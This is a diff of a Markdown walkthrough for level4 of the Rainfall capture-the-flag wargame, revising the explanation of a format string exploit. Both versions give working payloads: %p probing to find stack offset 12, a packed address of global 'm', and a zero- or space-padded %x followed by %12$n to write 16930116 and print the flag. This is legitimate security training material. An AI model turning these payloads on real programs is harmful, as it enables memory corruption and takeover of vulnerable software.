@@ -1,84 +1,77 @@
-# level4
-
-Pull the executable:
-
-```sh
-sshpass -f ../level3/flag scp level4@rainfall:level4 .
-```
-
-See `source.c` for source reconstitution.
-
 This exercise is similar to the previous one, except `m` now needs to be `16_930_116` (`0x1025544`), and the `printf(3)` call is nested in another function call.
 
-Before thinking too much about it, let's try the same approach as level3.  Address of `m` is `0x08049810`, so let's put that in our payload:
+First, we need to find the offset of our buffer:
 
 ```sh
-perl -e 'print pack("L<", 0x08049810), "%p %p %p %p %p\n"' | ./level4
-# -> 0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil)
+perl -e 'print "BBBB", "  %p" x 20, "\n"' | ./level4
 ```
 
-Nope.  What about more?
+It prints:
+
+```
+BBBB  0xb7ff26b0  0xbffff794  0xb7fd0ff4  (nil)  (nil)  0xbffff758  0x804848d  0xbffff550  0x200  0xb7fd1ac0  0xb7ff37d0  0x42424242  0x70252020  0x70252020  0x70252020  0x70252020  0x70252020  0x70252020  0x70252020  0x70252020
+```
+
+`0x42424242` is the 12th element.  Let's confirm that this is what we actually want:
 
 ```sh
-perl -e 'print pack("L<", 0x08049810), "%p %p %p %p %p %p %p\n"' | ./level4
-# -> 0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil) 0xbffff748 0x804848d
+echo '**** %12$p' | ./level4
 ```
 
-Still no luck.  But `0xbffff748` and `0x804848d` awfully look like what we saw in level2.  Maybe instead of overwriting `m` we could override the return address of `p`?
+Output:
 
-```sh
-perl -e 'print "%7\$n\n"' | ./level4
+```
+**** 0x2a2a2a2a
 ```
 
-We get a segmentation fault, and that's normal because we try to write at the return address, not at the address where it is saved in the stack frame.  What we did was basically equivalent to:
+Perfect.  The address of `m` is `0x08049810` so we can add to the payload:
+
+```
+perl -e 'print pack("L<", 0x08049810), "%4\$u%12\$p\n"' | ./level4
+```
+
+Then we need to use the `%n` conversion to somehow write `16930116` bytes to `m`.  We can't simply put that many bytes into the payload because the read limit is 512.  Instead, we can leverage the `printf(3)` flags.  Using the `0` flag is easiest because it pads any number with as many zeroes as we want.  For example:
 
 ```c
-*(unsigned int *)0x804848d = 0;
+printf("%05d\n", 42);
 ```
 
-It cannot work because `0x804848d` is located in section `.text`, which is read-only.
+Will print `00042`.  It does not work with the `%p` conversion though, so let's use `%x` instead.  It can be combined with positional arguments, like so: `%4$042x`.  This will print the 4th argument in hexadecimal, padded with zeroes to 42 characters.
 
-There doesn't seem to exist a way to get the address of the buffer that `"%n"` writes to, so let's move along.
-
-This still looks like a call stack after all, so maybe we should try to go further.  Let's make a tiny helper script that will test the possibilities for us:
+Let's put everything together.  We have 4 bytes for the address of `m`, so we need `16930116 - 4 = 16930112` bytes before using `%n`.
 
 ```sh
-for i in $(seq 64); do
-    s="$(echo "BBBB %$i\$p" | ~/level4)"
+{
+    # address of `m`
+    perl -e 'print pack("L<", 0x08049810)'
+
+    # print enough characters
+    echo -n '%12$016930112x'
+
+    # write number of written characters so far into `m`
+    echo -n '%12$n'
     
-    if [ "$s" = "BBBB 0x42424242" ]; then
-        echo "%$i\$p"
-        break
-    fi
-done
+    # new line so `printf(3)` flushes automatically for a more readable output
+    echo
+} | ./level4
 ```
 
-It prints `"%12$p"`, so let's put that in a payload:
-
-```sh
-perl -e 'print pack("L<", 0x08049810), "%12\$n", "\n"' > /tmp/4
-```
-
-We wrote 4 bytes (the address of `m`) before `"%n"`, so let's check that the value of `m` is 4 in GDB:
-
-```sh
-gdb ./level4
-watch m
-r </tmp/4
-```
-
-We get:
+It works and we do get the flag, but the output is full of zeroes and it can be hard to see what's going on.  It may also saturate the terminal because about 16MB of memory were just shoved into stdout.  There are two things we can do: change the padding from zeroes to spaces, and pipe the output into a program to remove what we don't want.  Using spaces for padding is simply a matter of changing the `0` flag by the ` ` (space) flag.  `echo -n '%12$016930112x'` becomes `echo -n '%12$ 16930112x'`.  Now for the program.  The options are basically endless, but `tr` (text replace) is a good choice.  We can use `tr -d ' '` to delete every single space from the output.  The final command is:
 
 ```
-Old value = 0
-New value = 4
-0xb7e71e2f in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+{
+    # address of `m`
+    perl -e 'print pack("L<", 0x08049810)'
+
+    # print enough characters
+    echo -n '%12$ 16930112x'
+
+    # write number of written characters so far into `m`
+    echo -n '%12$n'
+    
+    # new line so `printf(3)` flushes automatically for a more readable output
+    echo
+} | ./level4 | tr -d ' '
 ```
 
-It works, so now we need to somehow write 16930116 bytes using printf.  This may seem intimidating, but it's actually really easy.  Instead of putting millions of bytes into our format string (which wouldn't work because the programs reads at most 512 bytes from stdin), we can use the `printf(3)` padding modifier.  We know that the 4th value on the stack printf `(nil)`, that means it has value 0 therefore the output should be very predictable.
-
-```sh
-perl -e 'print pack("L<", 0x08049810), "%4\$16930112u", "%12\$n", "\n"' | ./level4
-```
-
-The output will take some time to be consumed, especially if stdout is a terminal over an SSH connection, but in the end we get the flag directly.
+We get a bit of garbage before and after the flag, but it is way more readable.
